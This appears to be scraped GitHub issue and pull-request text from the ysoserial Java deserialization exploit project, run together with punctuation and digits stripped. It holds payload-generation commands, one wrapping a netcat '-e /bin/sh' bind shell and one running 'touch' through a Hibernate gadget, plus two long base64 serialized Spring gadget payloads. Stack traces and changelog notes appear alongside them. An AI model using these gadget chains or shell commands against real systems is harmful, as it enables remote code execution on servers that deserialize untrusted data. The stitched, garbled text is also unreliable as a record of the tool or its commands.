 Was chatting with someone about some of this work and realized I never passed these payloads from my talks back upstream OS macOS High Sierra Version java jar ysoserialmaster c jar Spring usrbinnc l p e binsh WARNING An illegal reflective access operation has occurred WARNING Illegal reflective access by ysoserialpayloadsutilGadgets fileUsersDesktopysoserialmaster c jar to constructor comsunorgapachexalaninternalxsltctraxTemplatesImpl WARNING Please consider reporting this to the maintainers of ysoserialpayloadsutilGadgets WARNING Use illegalaccesswarn to enable warnings of further illegal reflective access operations WARNING All illegal access operations will be denied in a future release Error while generating or serializing payload comnqzeropermitPermitInitializationFailed initialization failed perhaps youre running with a security manager at comnqzeropermitPermitsetAccessiblePermitjava at ysoserialpayloadsutilReflectionssetAccessibleReflectionsjava at ysoserialpayloadsutilReflectionsgetFieldReflectionsjava at ysoserialpayloadsutilReflectionssetFieldValueReflectionsjava at ysoserialpayloadsutilGadgetscreateTemplatesImplGadgetsjava at ysoserialpayloadsutilGadgetscreateTemplatesImplGadgetsjava at ysoserialpayloadsSpring getObjectSpring java at ysoserialGeneratePayloadmainGeneratePayloadjava Caused by comnqzeropermitPermitFieldNotFound field override not found at comnqzeropermitPermitinitPermitjava at comnqzeropermitPermitbuildPermitjava at comnqzeropermitPermitclinitPermitjava more Trying the same command on some Linux Distro worked for me any solutions for this on macOSX This version of Jython executes a command through ossystem Based on Jython from pwntester cschneider Allow formatTable function to wrap long lines in columns Allow users to specify terminal width used by formatTable with terminalWidth command line property Fix display of dependencies to payloads implementing DynamicDependencies Remove trailing spaces on last column of terminalWidth Old terminal output on terminal with width img width altimage src Notice the extra new lines caused by trailing spaces on the last column as all columns try to be as wide as the ones overflowing New terminal output on terminal with width img width altimage src Example output of manual width img width altimage src Example output of manual width img width altimage src Adding a maven profile option to compile with Hibernate example mvn clean package DskipTests Dhibernate Exploiting hibernate works just as before java Dhibernate jar targetysoserial SNAPSHOTalljar Hibernate touch tmpysoserial tested worked for me Updated Link to HTTPS Potential fix for I have upgraded the TemplatesImpl exploit using RuntimeexecString Sorry if Im missing something obvious here but the payloads generated by the Docker image are different and less functional than those generated by a compiled jar Steps to reproduce git clone cd ysoserial docker build t ysoserial mvn clean package DskipTests docker run rm it Spring echo hi base w rO ABXNyAElvcmcuc ByaW nZnJhbWV b JrLmNvcmUuU VyaWFsaXphYmxlVHlwZVdyYXBwZXIkTWV aG kSW b tlVHlwZVByb ZpZGVyskq B tBGtcCAANJAAVpbmRleEwADQptZXRob ROYW ldAASTGphdmEvbGFuZy TdHJpbmc TAAIcHJvdmlkZXJ AD Mb JnL NwcmluZ ZyYW ld yay jb JlL NlcmlhbGl YWJsZVR cGVXcmFwcGVyJFR cGVQcm aWRlcjt cAAAAAB AA uZXdUcmFuc Zvcm lcnN AAAAAQA b JnLnNwcmluZ ZyYW ld yay jb JlLlNlcmlhbGl YWJsZVR cGVXcmFwcGVyJFR cGVQcm aWRlcnhyABdqYXZhLmxhbmcucmVmbGVjdC Qcm eeEn iDMEEPLAgABTAABaHQAJUxqYXZhL xhbmcvcmVmbGVjdC JbnZvY F aW uSGFuZGxlcjt cHNyADJzdW ucmVmbGVjdC hbm vdGF aW uLkFubm YXRpb JbnZvY F aW uSGFuZGxlclXK Q Vy lAgACTAAMbWVtYmVyVmFsdWVzdAAPTGphdmEvdXRpbC NYXA TAAEdHlwZXQAEUxqYXZhL xhbmcvQ xhc M eHBzcgARamF YS dGlsLkhhc hNYXAFB rBwxZg QMAAkYADQpsb FkRmFjdG ySQAJdGhyZXNob xkeHAQAAAAAAADHcIAAAAEAAAAAF AAdnZXRUeXBlc AAAACABZqYXZhLmxhbmcucmVmbGVjdC UeXBlAB qYXZheC bWwudHJhbnNmb JtLlRlbXBsYXRlc hxAH ABnNyAGBvcmcuc ByaW nZnJhbWV b JrLmJlYW zLmZhY Rvcnkuc VwcG ydC BdXRvd lyZVV aWxzJE iamVjdEZhY RvcnlEZWxlZ F aW nSW b NhdGlvbkhhbmRsZXKFYsvADP xEwIAAUwADW iamVjdEZhY Rvcnl ADFMb JnL NwcmluZ ZyYW ld yay iZWFucy mYWN b J L iamVjdEZhY Rvcnk eHBzfQAAAAEAL yZy zcHJpbmdmcmFtZXdvcmsuYmVhbnMuZmFjdG yeS PYmplY RGYWN b J eHEAfgAGc EAfgAJc EAfgANP AAAAAAAAx CAAAABAAAAABdAAJZ V T JqZWN c IAOmNvbS zdW ub JnLmFwYWNoZS YWxhbi pbnRlcm hbC c x Yy cmF LlRlbXBsYXRlc ltcGwJV BbqyrMwMABkkADV pbmRlbnROdW iZXJJAA fdHJhbnNsZXRJbmRleFsADQpfYnl ZWNvZGVzdAADW tCWwAGX NsYXNzdAASW xqYXZhL xhbmcvQ xhc M TAAFX hbWVxAH AAUwAEV vdXRwdXRQcm wZXJ aWVzdAAWTGphdmEvdXRpbC Qcm wZXJ aWVzO hwAAAAAP cgADW tCS ZFWdn zcCAAB cAAAAAJ cgACW Ks xf BghU AIAAHhwAAAGm rur AAAAyADkNCgADACIHADcHACUHACYBABBzZXJpYWxWZXJzaW uVUlEAQABSgEADUNvbnN YW VmFsdWUFrSCT Hd z BAAY aW pdD BAAMoKVYBAARDb RlAQAPTGluZU bWJlclRhYmxlAQASTG jYWxWYXJpYWJsZVRhYmxlAQAEdGhpcwEAE N dWJUcmFuc xldFBheWxvYWQBAAxJbm lckNsYXNzZXMBADVMeXNvc VyaWFsL BheWxvYWRzL V aWwvR FkZ V cyRTdHViVHJhbnNsZXRQYXlsb FkOwEACXRyYW zZm ybQEAcihMY tL N bi vcmcvYXBhY hlL hhbGFuL ludGVybmFsL hzbHRjL RPTTtbTGNvbS zdW vb JnL FwYWNoZS bWwvaW ZXJuYWwvc VyaWFsaXplci TZXJpYWxpemF aW uSGFuZGxlcjspVgEACGRvY VtZW AQAtTGNvbS zdW vb JnL FwYWNoZS YWxhbi pbnRlcm hbC c x Yy ET AQAIaGFuZGxlcnMBAEJbTGNvbS zdW vb JnL FwYWNoZS bWwvaW ZXJuYWwvc VyaWFsaXplci TZXJpYWxpemF aW uSGFuZGxlcjsBAA KRXhjZXB aW ucwcAJwEApihMY tL N bi vcmcvYXBhY hlL hhbGFuL ludGVybmFsL hzbHRjL RPTTtMY tL N bi vcmcvYXBhY hlL htbC pbnRlcm hbC kdG vRFRNQXhpc l ZXJhdG yO xjb vc VuL yZy hcGFjaGUveG sL ludGVybmFsL NlcmlhbGl ZXIvU VyaWFsaXphdGlvbkhhbmRsZXI KVYBAAhpdGVyYXRvcgEANUxjb vc VuL yZy hcGFjaGUveG sL ludGVybmFsL R bS EVE BeGlzSXRlcmF b I AQAHaGFuZGxlcgEAQUxjb vc VuL yZy hcGFjaGUveG sL ludGVybmFsL NlcmlhbGl ZXIvU VyaWFsaXphdGlvbkhhbmRsZXI AQANClNvdXJjZUZpbGUBAAxHYWRnZXRzLmphdmEMAA KAAsHACgBADN c zZXJpYWwvcGF bG hZHMvdXRpbC HYWRnZXRzJFN dWJUcmFuc xldFBheWxvYWQBAEBjb vc VuL yZy hcGFjaGUveGFsYW vaW ZXJuYWwveHNsdGMvcnVudGltZS BYnN cmFjdFRyYW zbGV AQAUamF YS pby TZXJpYWxpemFibGUBADljb vc VuL yZy hcGFjaGUveGFsYW vaW ZXJuYWwveHNsdGMvVHJhbnNsZXRFeGNlcHRpb BAB c zZXJpYWwvcGF bG hZHMvdXRpbC HYWRnZXRzAQAIPGNsaW pdD BABFqYXZhL xhbmcvUnVudGltZQcAKgEADQpnZXRSdW aW lAQAVKClMamF YS sYW nL J bnRpbWU DAAsAC NCgArAC BAAdlY hvIGhpCAAwAQAEZXhlYwEAJyhMamF YS sYW nL N cmluZzspTGphdmEvbGFuZy Qcm jZXNzOwwAMgAzDQoAKwA AQANU RhY tNYXBUYWJsZQEAHXlzb NlcmlhbC Qd lcjg NzgyNTEyMTAyNzA AQAfTHlzb NlcmlhbC Qd lcjg NzgyNTEyMTAyNzA OwAhAAIAAwABAAQAAQAaAAUABgABAAcAAAACAAgABAABAA KAAsAAQAMAAAALwABAAEAAAAFKrcAAbEAAAACAA AAAAGAAEAAAAvAA AAAAMAAEAAAAFAA AOAAAAAEAEwAUAAIADAAAAD AAAADAAAAAbEAAAACAA AAAAGAAEAAAA AA AAAAgAAMAAAABAA AOAAAAAAAAQAVABYAAQAAAAEAFwAYAAIAGQAAAAQAAQAaAAEAEwAbAAIADAAAAEkAAAAEAAAAAbEAAAACAA AAAAGAAEAAAA AA AAAAqAAQAAAABAA AOAAAAAAAAQAVABYAAQAAAAEAHAAdAAIAAAABAB AHwADABkAAAAEAAEAGgAIACkACwABAAwAAAAkAAMAAgAAAAnAAMBTLgALxIxtgA V EAAAABADYAAAADAAEDAAIAIAAAAAIAIQARAAAADQoAAQACACMAEAAJdXEAfgAhAAAB Mrur AAAAyABsNCgADABUHABcHABgHABkBABBzZXJpYWxWZXJzaW uVUlEAQABSgEADUNvbnN YW VmFsdWUFceZp jxtRxgBAAY aW pdD BAAMoKVYBAARDb RlAQAPTGluZU bWJlclRhYmxlAQASTG jYWxWYXJpYWJsZVRhYmxlAQAEdGhpcwEAA ZvbwEADElubmVyQ xhc NlcwEAJUx c zZXJpYWwvcGF bG hZHMvdXRpbC HYWRnZXRzJEZvbzsBAA KU cmNlRmlsZQEADEdhZGdldHMuamF YQwADQoACwcAGgEAI lzb NlcmlhbC wYXlsb Fkcy dGlsL dhZGdldHMkRm vAQAQamF YS sYW nL iamVjdAEAFGphdmEvaW vU VyaWFsaXphYmxlAQAfeXNvc VyaWFsL BheWxvYWRzL V aWwvR FkZ V cwAhAAIAAwABAAQAAQAaAAUABgABAAcAAAACAAgAAQABAA KAAsAAQAMAAAALwABAAEAAAAFKrcAAbEAAAACAA AAAAGAAEAAAA AA AAAAMAAEAAAAFAA AEgAAAAIAEwAAAAIAFAARAAAADQoAAQACABYAEAAJcHQABFB bnJwdwEAeHh cgASamF YS sYW nLk ZXJyaWRlAAAAAAAAAAAAAAB cHhxAH AJg java jar targetysoserial SNAPSHOTalljar Spring echo hi base w rO ABXNyAElvcmcuc ByaW nZnJhbWV b JrLmNvcmUuU VyaWFsaXphYmxlVHlwZVdyYXBwZXIkTWV aG kSW b tlVHlwZVByb ZpZGVyskq B tBGtcCAANJAAVpbmRleEwACm ldGhvZE hbWV ABJMamF YS sYW nL N cmluZztMAAhwcm aWRlcnQAP xvcmcvc ByaW nZnJhbWV b JrL NvcmUvU VyaWFsaXphYmxlVHlwZVdyYXBwZXIkVHlwZVByb ZpZGVyO hwAAAAAHQADm ld RyYW zZm ybWVyc AAAABAD vcmcuc ByaW nZnJhbWV b JrLmNvcmUuU VyaWFsaXphYmxlVHlwZVdyYXBwZXIkVHlwZVByb ZpZGVyeHIAF phdmEubGFuZy yZWZsZWN LlByb h SfaIMwQQ sCAAFMAAFodAAlTGphdmEvbGFuZy yZWZsZWN L ludm jYXRpb IYW kbGVyO hwc IAMnN bi yZWZsZWN LmFubm YXRpb uQW ub RhdGlvbkludm jYXRpb IYW kbGVyVcr DxXLfqUCAAJMAAxtZW iZXJWYWx ZXN AA MamF YS dGlsL hcDtMAAR eXBldAARTGphdmEvbGFuZy DbGFzczt cHNyABFqYXZhLnV aWwuSGFzaE hcAUH sHDFmDRAwACRgAKbG hZEZhY RvckkACXRocmVzaG sZHhwP AAAAAAAAx CAAAABAAAAABdAAHZ V VHlwZXN AAAAAgAWamF YS sYW nLnJlZmxlY QuVHlwZQAdamF YXgueG sLnRyYW zZm ybS UZW wbGF ZXN cQBAAZzcgBgb JnLnNwcmluZ ZyYW ld yay iZWFucy mYWN b J LnN cHBvcnQuQXV b dpcmVVdGlscyRPYmplY RGYWN b J RGVsZWdhdGluZ ludm jYXRpb IYW kbGVyhWLLwAz MRMCAAFMAA vYmplY RGYWN b J dAAxTG yZy zcHJpbmdmcmFtZXdvcmsvYmVhbnMvZmFjdG yeS PYmplY RGYWN b J O hwc AAAABAC vcmcuc ByaW nZnJhbWV b JrLmJlYW zLmZhY RvcnkuT JqZWN RmFjdG yeXhxAH ABnNxAH ACXNxAH ADT AAAAAAAAMdwgAAAAQAAAAAXQACWdldE iamVjdHNyADpjb uc VuLm yZy hcGFjaGUueGFsYW uaW ZXJuYWwueHNsdGMudHJheC UZW wbGF ZXNJbXBsCVdPwW sqzMDAAZJAA faW kZW TnVtYmVySQAOX RyYW zbGV SW kZXhbAApfYnl ZWNvZGVzdAADW tCWwAGX NsYXNzdAASW xqYXZhL xhbmcvQ xhc M TAAFX hbWVxAH AAUwAEV vdXRwdXRQcm wZXJ aWVzdAAWTGphdmEvdXRpbC Qcm wZXJ aWVzO hwAAAAAP cgADW tCS ZFWdn zcCAAB cAAAAAJ cgACW Ks xf BghU AIAAHhwAAAGm rur AAAAyADkKAAMAIgcANwcAJQcAJgEAEHNlcmlhbFZlcnNpb VSUQBAAFKAQANQ uc RhbnRWYWx ZQWtIJPzkd vPgEABjxpbml PgEAAygpVgEABENvZGUBAA MaW lTnVtYmVyVGFibGUBABJMb NhbFZhcmlhYmxlVGFibGUBAAR aGlzAQATU R YlRyYW zbGV UGF bG hZAEADElubmVyQ xhc NlcwEANUx c zZXJpYWwvcGF bG hZHMvdXRpbC HYWRnZXRzJFN dWJUcmFuc xldFBheWxvYWQ AQAJdHJhbnNmb JtAQByKExjb vc VuL yZy hcGFjaGUveGFsYW vaW ZXJuYWwveHNsdGMvRE NO tMY tL N bi vcmcvYXBhY hlL htbC pbnRlcm hbC zZXJpYWxpemVyL NlcmlhbGl YXRpb IYW kbGVyOylWAQAIZG jdW lbnQBAC MY tL N bi vcmcvYXBhY hlL hhbGFuL ludGVybmFsL hzbHRjL RPTTsBAAhoYW kbGVycwEAQltMY tL N bi vcmcvYXBhY hlL htbC pbnRlcm hbC zZXJpYWxpemVyL NlcmlhbGl YXRpb IYW kbGVyOwEACkV Y VwdGlvbnMHACcBAKYoTGNvbS zdW vb JnL FwYWNoZS YWxhbi pbnRlcm hbC c x Yy ET TGNvbS zdW vb JnL FwYWNoZS bWwvaW ZXJuYWwvZHRtL RUTUF aXNJdGVyYXRvcjtMY tL N bi vcmcvYXBhY hlL htbC pbnRlcm hbC zZXJpYWxpemVyL NlcmlhbGl YXRpb IYW kbGVyOylWAQAIaXRlcmF b IBADVMY tL N bi vcmcvYXBhY hlL htbC pbnRlcm hbC kdG vRFRNQXhpc l ZXJhdG yOwEAB hhbmRsZXIBAEFMY tL N bi vcmcvYXBhY hlL htbC pbnRlcm hbC zZXJpYWxpemVyL NlcmlhbGl YXRpb IYW kbGVyOwEAClNvdXJjZUZpbGUBAAxHYWRnZXRzLmphdmEMAAoACwcAKAEAM lzb NlcmlhbC wYXlsb Fkcy dGlsL dhZGdldHMkU R YlRyYW zbGV UGF bG hZAEAQGNvbS zdW vb JnL FwYWNoZS YWxhbi pbnRlcm hbC c x Yy ydW aW lL Fic RyYWN VHJhbnNsZXQBABRqYXZhL lvL NlcmlhbGl YWJsZQEAOWNvbS zdW vb JnL FwYWNoZS YWxhbi pbnRlcm hbC c x Yy UcmFuc xldEV Y VwdGlvbgEAH lzb NlcmlhbC wYXlsb Fkcy dGlsL dhZGdldHMBAAg Y xpbml PgEAEWphdmEvbGFuZy SdW aW lBwAqAQAKZ V UnVudGltZQEAFSgpTGphdmEvbGFuZy SdW aW lOwwALAAtCgArAC BAAdlY hvIGhpCAAwAQAEZXhlYwEAJyhMamF YS sYW nL N cmluZzspTGphdmEvbGFuZy Qcm jZXNzOwwAMgAzCgArADQBAA TdGFja hcFRhYmxlAQAdeXNvc VyaWFsL B bmVyODU NjM MDIzNjM NDIBAB MeXNvc VyaWFsL B bmVyODU NjM MDIzNjM NDI ACEAAgADAAEABAABABoABQAGAAEABwAAAAIACAAEAAEACgALAAEADAAAAC AAQABAAAABSq AAGxAAAAAgANAAAABgABAAAALwAOAAAADAABAAAABQAPADgAAAABABMAFAACAAwAAAAAAAAAwAAAAGxAAAAAgANAAAABgABAAAANAAOAAAAIAADAAAAAQAPADgAAAAAAAEAFQAWAAEAAAABABcAGAACABkAAAAEAAEAGgABABMAGwACAAwAAABJAAAABAAAAAGxAAAAAgANAAAABgABAAAAOAAOAAAAKgAEAAAAAQAPADgAAAAAAAEAFQAWAAEAAAABABwAHQACAAAAAQAeAB AAwAZAAAABAABABoACAApAAsAAQAMAAAAJAADAAIAAAAPpwADAUy AC SMbYANVexAAAAAQA AAAAAwABAwACACAAAAACACEAEQAAAAoAAQACACMAEAAJdXEAfgAhAAAB Mrur AAAAyABsKAAMAFQcAFwcAGAcAGQEAEHNlcmlhbFZlcnNpb VSUQBAAFKAQANQ uc RhbnRWYWx ZQVx mnuPG HGAEABjxpbml PgEAAygpVgEABENvZGUBAA MaW lTnVtYmVyVGFibGUBABJMb NhbFZhcmlhYmxlVGFibGUBAAR aGlzAQADRm vAQAMSW uZXJDbGFzc VzAQAlTHlzb NlcmlhbC wYXlsb Fkcy dGlsL dhZGdldHMkRm vOwEAClNvdXJjZUZpbGUBAAxHYWRnZXRzLmphdmEMAAoACwcAGgEAI lzb NlcmlhbC wYXlsb Fkcy dGlsL dhZGdldHMkRm vAQAQamF YS sYW nL iamVjdAEAFGphdmEvaW vU VyaWFsaXphYmxlAQAfeXNvc VyaWFsL BheWxvYWRzL V aWwvR FkZ V cwAhAAIAAwABAAQAAQAaAAUABgABAAcAAAACAAgAAQABAAoACwABAAwAAAAvAAEAAQAAAAUqtwABsQAAAAIADQAAAAYAAQAAADwADgAAAAwAAQAAAAUADwASAAAAAgATAAAAAgAUABEAAAAKAAEAAgAWABAACXB AARQd ycHcBAHh dnIAEmphdmEubGFuZy PdmVycmlkZQAAAAAAAAAAAAAAeHB cQBACY 